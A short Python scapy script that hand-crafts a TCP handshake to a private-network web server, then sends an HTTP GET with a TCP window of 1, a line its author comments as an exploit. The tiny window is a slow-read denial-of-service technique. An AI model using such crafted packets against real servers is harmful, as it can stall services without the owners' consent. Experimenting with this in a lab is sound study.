from scapy.all import *

#Target machine
dstIP = "192.168.1.254"
dstPort = 80 

RandSport=RandNum(1024,65535)

#Defined Pkt

##Syn packet!
ipHeader = IP(dst=dstIP)
synTcpHeader = TCP(sport=RandSport,dport=dstPort, flags='S')
synPacket = ipHeader/synTcpHeader

# Send
synACK = sr1(synPacket)

if synACK:
    print("syn ACK recevie")
    print(synACK.summary())
    print(synACK.show())
else:
    print("Not Recevied")

## ACK packet  

http = 'GET / HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n'
tcpACK = IP(dst=dstIP) / TCP(dport=80, sport=synACK[TCP].dport,seq=synACK[TCP].ack, ack=synACK[TCP].seq + 1, flags='A',window=1) #Exploit 
httpRequest = tcpACK / http

httpResponse = sr1(httpRequest)

if httpResponse:
    print("HTTPresponse Receive")
    print(httpResponse.summary())
    print(httpResponse.show())
else:
    print("no Recevie HTTP response")